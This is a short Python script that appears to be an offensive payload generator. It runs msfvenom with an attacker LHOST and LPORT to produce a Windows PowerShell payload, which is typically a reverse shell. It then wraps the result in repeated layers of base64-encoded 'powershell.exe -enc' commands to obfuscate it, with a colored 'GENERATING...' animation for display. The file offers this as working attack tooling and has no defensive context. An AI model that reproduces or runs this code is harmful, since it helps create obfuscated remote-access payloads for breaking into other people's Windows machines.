import codecs
import subprocess
import sys
import time
import multiprocessing
from colorama import init, Fore, Style
init()

def loadanim():
	while True:
		c = ["G","E","N","E","R","A","T","I","N","G",".",".","."]
		for d in range(len(c)):
			c = ["G","E","N","E","R","A","T","I","N","G",".",".","."]
			b = c; b[d]; b[d] = Fore.RED + b[d] + Fore.GREEN
			sys.stdout.write(f'{Style.BRIGHT}\r{Fore.YELLOW}[ {Fore.GREEN}' + ''.join(b) + f' {Fore.YELLOW}]{Style.RESET_ALL}')
			sys.stdout.flush()
			time.sleep(0.1)

def psencode(code):
	return codecs.encode(codecs.encode(code,'utf-16-le'),'base64').decode('utf-8').replace('\n','')

def venom_gen(payload,lhost,lport,iterations):
	proc = subprocess.Popen(f"msfvenom --payload {payload} LHOST={lhost} LPORT={lport} --smallest --platform windows", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	result = 'powershell' + proc.communicate()[0].split(b'powershell')[1].decode("ascii")
	for iteration in range(iterations):
		result = powershell_b64_exec(result)
	return result

def powershell_b64_exec(code):
	return 'powershell.exe -enc ' + psencode(code)
